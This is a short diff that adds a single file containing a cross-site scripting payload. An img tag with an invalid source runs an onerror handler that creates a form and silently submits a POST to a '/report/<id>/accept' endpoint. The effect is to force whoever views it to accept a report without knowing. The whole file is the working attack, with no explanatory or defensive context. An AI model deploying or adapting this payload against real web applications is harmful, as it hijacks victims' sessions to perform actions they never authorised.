@@ -1,0 +1,7 @@
+<><img src="x" onerror="
+  var f = document.createElement('form');
+  f.setAttribute('method', 'POST');
+  f.setAttribute('action', '/report/5897206c-5e90-48e6-b8bb-58888a873526/accept');
+  document.body.appendChild(f);
+  f.submit();
+">
